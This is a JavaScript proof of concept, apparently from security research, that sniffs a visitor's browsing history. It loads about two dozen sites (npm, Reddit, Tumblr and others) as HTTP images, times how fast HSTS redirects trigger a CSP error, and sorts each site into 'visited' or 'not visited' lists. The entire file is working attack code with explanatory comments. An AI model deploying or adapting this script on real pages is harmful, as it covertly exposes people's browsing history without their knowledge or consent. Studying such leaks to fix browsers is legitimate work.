// Timing in milliseconds above which a network request probably occurred.
// TODO: Determine this dynamically from the distribution of response times.
var TIMING_THRESHOLD = 6;
// Use an arbitrary static preloaded HSTS host for timing calibration
var BENCHMARK_HOST = 'http://eff.org/';
// Initial timing calibration offset. This gets recalculated every other fetch.
var OFFSET = 0;

var visitedElem = document.getElementById('visited');
var notVisitedElem = document.getElementById('not_visited');

// Edit this based on scraper results.
var hosts = [
'http://www.npmjs.com/',
'http://www.xoom.com/',
'http://atom.io/',
'http://hackpad.com/',
'http://angel.co/',
'http://vine.co/',
'http://www.oculus.com/en-us/',
'http://www.hackerrank.com/',
'http://noscript.net/',
'http://www.sixt.com/',
'http://www.crazydomains.com.au/',
'http://www.yola.com/',
'http://www.mailerlite.com/',
'http://giustizia.it/',
'http://notepad-plus-plus.org/',
'http://www.tumblr.com/',
'http://www.reddit.com/',
'http://www.petfinder.com/',
'http://www.messenger.com/',
'http://www.digitalpoint.com/',
'http://www.blibli.com/',
'http://namu.wiki/',
'http://launchpad.net/'
];

/**
 * Our CSP policy (HTTP-only images) causes this to fire whenever the img src
 * redirects to HTTPS, either by HSTS (307) or plain old redirects (301/302).
 * @param {number} start
 * @param {string} host
 * @private
 */
function onImgError_(start, host) {
  var time = new Date().getTime() - start;
  if (host === BENCHMARK_HOST) {
    // This is a calibration measurement so update the offset time.
    OFFSET = time;
  } else {
    display(host, time - OFFSET);
  }
}

/**
 * Times how long a request takes by loading it as an img src and waiting for
 * the error to fire. I would use XHR here but it turns out CORS errors fire
 * before CSP.
 * @param {string} host
 */
function timeRequest(host) {
  var img = new Image();
  img.onerror = onImgError_.bind(this, new Date().getTime(), host);
  img.src = host + '?foobar' + Math.random().toString().substring(2);
}

/**
 * Measures the calibration drift so we have a better estimate of how long
 * a resource fetch actually took. Since we expect the time T to fetch a
 * preloaded STS host to be ~constant, the fact that it changes indicates
 * that our timing is getting skewed by some amount, probably due to JIT
 * optimization. Correct for the skew by subtracting T from measurements that
 * happen shortly after.
 */
function calibrateTime() {
  timeRequest(BENCHMARK_HOST);
}

/**
 * Display the results.
 * @param {string} url
 * @param {number} time
 */
function display(url, time) {
  console.log(url, time, OFFSET);
  var li = document.createElement('li');
  var host = url.replace('http://', '').split('/')[0];
  li.appendChild(document.createTextNode(host));
  if (time < TIMING_THRESHOLD) {
    visitedElem.appendChild(li);
  } else {
    notVisitedElem.appendChild(li);
  }
}

// Main loop
hosts.forEach(function(host) {
  calibrateTime();
  timeRequest(host);
});
